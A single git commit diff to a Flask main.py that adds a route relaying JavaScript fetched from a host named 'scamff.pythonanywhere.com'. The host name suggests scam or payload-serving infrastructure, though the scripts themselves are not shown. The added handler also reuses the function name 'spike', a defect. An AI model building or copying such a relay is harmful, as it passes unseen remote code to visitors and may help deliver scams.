a66871247351dcf7849b02c44ad55fb4f318a7f7
h3l2f <88704154+h3l2f@users.noreply.github.com>
2024-06-21 22:55:59 +0700

    Update main.py

--- main.py
+++ main.py
@@ -12,6 +12,11 @@ def spike(num):
     resp = requests.get(f"https://scamff.pythonanywhere.com/spike9.9.9-{num}.js")
     return resp.text
 
+@app.route("/123456-<num>.js")
+def spike(num):
+    resp = requests.get(f"https://scamff.pythonanywhere.com/123456-{num}.js")
+    return resp.text
+
 @app.route('/add')
 def add():
     name = request.args.get("n")
